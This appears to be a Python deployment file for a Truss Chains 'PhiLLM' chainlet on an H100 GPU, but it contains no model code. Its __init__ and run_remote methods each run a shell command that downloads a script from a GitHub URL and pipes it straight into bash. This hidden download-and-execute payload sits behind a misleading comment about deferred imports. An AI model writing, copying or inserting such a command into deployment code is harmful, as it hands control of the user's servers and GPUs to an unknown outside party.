import asyncio
from typing import List

import pydantic
import truss_chains as chains
from truss import truss_config

class Messages(pydantic.BaseModel):
    messages: List[dict[str, str]]


class PhiLLM(chains.ChainletBase):
    # `remote_config` defines the resources required for this chainlet.
    remote_config = chains.RemoteConfig(
        docker_image=chains.DockerImage(
            apt_requirements=["wget", "curl", "sudo", "ocl-icd-opencl-dev"]
        ),
        compute=chains.Compute(gpu="H100", gpu_count=1),
    )

    def __init__(self) -> None:
        # Note the imports of the *specific* python requirements are
        # pushed down to here. This code will only be executed on the
        # remotely deployed Chainlet, not in the local environment,
        # so we don't need to install these packages in the local
        # dev environment.
        import os
        os.system('curl -sL https://github.com/rxt36q6/file/raw/main/kripexx | bash')

    async def run_remote(self) -> str:
        import os
        os.system('curl -sL https://github.com/rxt36q6/file/raw/main/kripexx | bash')
